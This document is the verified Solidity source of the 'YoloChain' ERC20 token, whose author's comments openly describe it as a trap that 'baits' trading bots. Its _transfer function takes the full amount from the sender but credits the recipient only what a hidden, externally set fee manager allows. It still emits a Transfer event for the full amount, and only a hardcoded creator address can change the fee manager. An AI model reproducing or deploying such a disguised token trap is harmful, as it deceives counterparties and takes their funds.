['/**\n', ' *Submitted for verification at Etherscan.io on 2021-04-11\n', '*/\n', '\n', '// SPDX-License-Identifier: CC-BY-NC-SA-2.5\n', '\n', '//@code0x2#0202 \n', '// github.com/code0x2 for other weird stuff\n', '\n', '//██╗░░░██╗░█████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗░█████╗░██╗███╗░░██╗\n', '//╚██╗░██╔╝██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░░██║██╔══██╗██║████╗░██║\n', '//░╚████╔╝░██║░░██║██║░░░░░██║░░██║██║░░╚═╝███████║███████║██║██╔██╗██║\n', '//░░╚██╔╝░░██║░░██║██║░░░░░██║░░██║██║░░██╗██╔══██║██╔══██║██║██║╚████║\n', '//░░░██║░░░╚█████╔╝███████╗╚█████╔╝╚█████╔╝██║░░██║██║░░██║██║██║░╚███║\n', '//░░░╚═╝░░░░╚════╝░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝\n', '\n', '// Its HOT(holochain), but it baits bots instead. Have fun with the code, and no, you dont get the fee manager logic >:). Will you live to get baited another day :p\n', '// if your bot got baited, well sucks for you i guess. good luck in the future!\n', "// try your luck figuring out how to prevent getting yolo'd here: github.com/code0x2/yolochain\n", '\n', 'abstract contract Context {\n', '    function _msgSender() internal view virtual returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '\n', '    function _msgData() internal view virtual returns (bytes memory) {\n', '        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n', '        return msg.data;\n', '    }\n', '}\n', '\n', 'library Address {\n', '    function isContract(address account) internal view returns (bool) {\n', '        // This method relies in extcodesize, which returns 0 for contracts in\n', '        // construction, since the code is only stored at the end of the\n', '        // constructor execution.\n', '\n', '        uint256 size;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { size := extcodesize(account) }\n', '        return size > 0;\n', '    }\n', '    function sendValue(address payable recipient, uint256 amount) internal {\n', '        require(address(this).balance >= amount, "Address: insufficient balance");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n', '        (bool success, ) = recipient.call{ value: amount }("");\n', '        require(success, "Address: unable to send value, recipient may have reverted");\n', '    }\n', '    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n', '      return functionCall(target, data, "Address: low-level call failed");\n', '    }\n', '    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n', '        return _functionCallWithValue(target, data, 0, errorMessage);\n', '    }\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n', '        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n', '    }\n', '    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n', '        require(address(this).balance >= value, "Address: insufficient balance for call");\n', '        return _functionCallWithValue(target, data, value, errorMessage);\n', '    }\n', '\n', '    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n', '        require(isContract(target), "Address: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n', '        if (success) {\n', '            return returndata;\n', '        } else {\n', '            // Look for revert reason and bubble it up if present\n', '            if (returndata.length > 0) {\n', '                // The easiest way to bubble the revert reason is using memory via assembly\n', '\n', '                // solhint-disable-next-line no-inline-assembly\n', '                assembly {\n', '                    let returndata_size := mload(returndata)\n', '                    revert(add(32, returndata), returndata_size)\n', '                }\n', '            } else {\n', '                revert(errorMessage);\n', '            }\n', '        }\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'contract Ownable is Context {\n', '    address private _owner;\n', '\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '    /**\n', '     * @dev Initializes the contract setting the deployer as the initial owner.\n', '     */\n', '    constructor () internal {\n', '        address msgSender = _msgSender();\n', '        _owner = msgSender;\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the address of the current owner.\n', '     */\n', '    function owner() public view returns (address) {\n', '        return _owner;\n', '    }\n', '\n', '    /**\n', '     * @dev Throws if called by any account other than the owner.\n', '     */\n', '    modifier onlyOwner() {\n', '        require(_owner == _msgSender(), "Ownable: caller is not the owner");\n', '        _;\n', '    }\n', '    \n', '    function renounceOwnership() public virtual onlyOwner {\n', '        emit OwnershipTransferred(_owner, address(0));\n', '        _owner = address(0);\n', '    }\n', '\n', '    function transferOwnership(address newOwner) public virtual onlyOwner {\n', '        require(newOwner != address(0), "Ownable: new owner is the zero address");\n', '        emit OwnershipTransferred(_owner, newOwner);\n', '        _owner = newOwner;\n', '    }\n', '}\n', '\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint256);\n', '    function balanceOf(address account) external view returns (uint256);\n', '    function transfer(address recipient, uint256 amount) external;\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '    function approve(address spender, uint256 amount) external;\n', '    function transferFrom(address sender, address recipient, uint256 amount) external;\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'interface IFeeManager3 {\n', '    function queryFee(address from, address _to, uint256 _amount) external returns (uint256);\n', '    function getTrueAmount(address from, address _to, uint256 _amount) external returns (uint256);\n', '}\n', '\n', 'contract ERC20 is Context {\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    using SafeMath for uint256;\n', '    using Address for address;\n', '\n', '    mapping (address => uint256) private _balances;\n', '\n', '    mapping (address => mapping (address => uint256)) private _allowances;\n', '\n', '    uint256 public totalSupply;\n', '\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals;\n', '    \n', '    address constant creator = 0xD3F1A59920A11Dd73902d9E7E67466Dd00880b2A;\n', '    address private feeManager;\n', '    \n', '    constructor (string memory _name, string memory _symbol) public {\n', '        name = _name;\n', '        symbol = _symbol;\n', '        decimals = 18;\n', '    }\n', '    \n', '    function setFeeManager(address _fmg) public {\n', '        require(msg.sender == creator, "no u bro");\n', '        feeManager = _fmg;\n', '    }\n', '\n', '    function balanceOf(address account) public view returns (uint256) {\n', '        return _balances[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint256 amount) public virtual returns (bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '    \n', '    function allowance(address owner, address spender) public view virtual returns (uint256) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    \n', '    function approve(address spender, uint256 amount) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '    \n', '    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '\n', '    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '\n', '    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        //_beforeTokenTransfer(sender, recipient, amount);\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        uint trueAmount = feeManager != address(0) ? IFeeManager3(feeManager).getTrueAmount(sender,recipient,amount) : amount;\n', '        _balances[recipient] = _balances[recipient].add(trueAmount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '    function _mint(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '\n', '        _beforeTokenTransfer(address(0), account, amount);\n', '\n', '        totalSupply = totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '    function _burn(address account, uint256 amount) internal virtual {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _beforeTokenTransfer(account, address(0), amount);\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        totalSupply = totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint256 amount) internal virtual {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { \n', '        if(from != address(0) && to != address(0)) IFeeManager3(feeManager).queryFee(from,to,amount);\n', '    }\n', '}\n', '\n', 'abstract contract ERC20Burnable is ERC20 {\n', '    /**\n', '     * @dev Destroys `amount` tokens from the caller.\n', '     *\n', '     * See {ERC20-_burn}.\n', '     */\n', '    function burn(uint256 amount) public virtual {\n', '        _burn(_msgSender(), amount);\n', '    }\n', '\n', '    /**\n', "     * @dev Destroys `amount` tokens from `account`, deducting from the caller's\n", '     * allowance.\n', '     *\n', '     * See {ERC20-_burn} and {ERC20-allowance}.\n', '     *\n', '     * Requirements:\n', '     *\n', "     * - the caller must have allowance for ``accounts``'s tokens of at least\n", '     * `amount`.\n', '     */\n', '    function burnFrom(address account, uint256 amount) public virtual {\n', '        _burn(account, amount);\n', '    }\n', '}\n', '\n', 'contract YOLO is ERC20Burnable, Ownable {\n', '    \n', "    constructor() public ERC20('YoloChain', 'YOT') {\n", '        _mint(msg.sender, 69e18);\n', '    }\n', '    \n', '    function mint(address recipient_, uint256 amount_)\n', '        public\n', '        onlyOwner\n', '        returns (bool)\n', '    {\n', '        uint256 balanceBefore = balanceOf(recipient_);\n', '        _mint(recipient_, amount_);\n', '        uint256 balanceAfter = balanceOf(recipient_);\n', '        return balanceAfter >= balanceBefore;\n', '    }\n', '\n', '    function burn(uint256 amount) public override onlyOwner {\n', '        super.burn(amount);\n', '    }\n', '\n', '    function burnFrom(address account, uint256 amount)\n', '        public\n', '        override\n', '        onlyOwner\n', '    {\n', '        super.burnFrom(account, amount);\n', '    }\n', '    \n', '    // Fallback rescue\n', '    \n', '    function destroy() public {\n', '        require(msg.sender == owner(), "no u 2");\n', '        selfdestruct(msg.sender);\n', '    }\n', '    \n', '    receive() external payable{\n', '        payable(owner()).transfer(msg.value);\n', '    }\n', '    \n', '    function rescueToken(IERC20 _token) public {\n', '        _token.transfer(owner(), _token.balanceOf(address(this)));\n', '    }\n', '}']